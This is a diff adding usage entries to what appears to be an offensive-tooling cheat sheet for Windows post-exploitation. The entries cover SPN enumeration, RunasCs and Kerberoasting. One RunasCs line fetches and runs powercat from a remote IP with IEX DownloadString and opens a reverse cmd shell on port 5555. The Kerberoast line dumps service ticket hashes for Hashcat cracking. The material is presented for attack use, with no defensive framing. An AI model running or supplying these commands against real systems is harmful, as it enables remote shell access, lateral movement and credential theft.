@@ -254,3 +254,30 @@ chmod +x polkit/exploit.polkit.sh
 "
 ```
 
+# Utils: Get-SPN.ps1
+## Description: 
+## Path: /utils/windows/Get-SPN.ps1
+## Shortcut: windows_GETSPN
+## Usage:
+```powershell
+import-module .\Get-SPN.ps1
+.\Get-SPN.ps1
+```
+# Utils: Invoke-RunasCs.ps1
+## Description: 
+## Path: /utils/windows/Invoke-RunasCs.ps1
+## Shortcut: windows_InvokeRunasCS
+## Usage:
+```
+Invoke-RunasCs -Username username -Password password -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/powercat.ps1');powercat -c 192.168.1.1 -p 5555 -e cmd"
+Invoke-RunasCs -Username username -Password password -Command "shell.exe"
+```
+# Utils: Invoke-Kerberoast.ps1
+## Description: 
+## Path: /utils/windows/Invoke-Kerberoast.ps1
+## Shortcut: $windows_invoke_kerberoast
+## Usage:
+```powershell
+import .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast -OutputFormat Hashcat | fl
+```
